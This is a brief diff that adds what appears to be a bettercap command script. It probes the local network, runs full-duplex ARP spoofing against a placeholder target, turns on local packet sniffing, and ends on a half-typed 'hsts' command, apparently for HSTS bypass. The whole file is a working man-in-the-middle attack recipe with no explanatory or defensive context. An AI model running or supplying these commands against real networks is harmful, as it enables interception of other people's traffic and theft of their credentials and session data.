@@ -1,0 +1,7 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.target <ip-of-target>
+arp.spoof on
+net.sniff.local true
+net.sniff on
+hsts<tab>
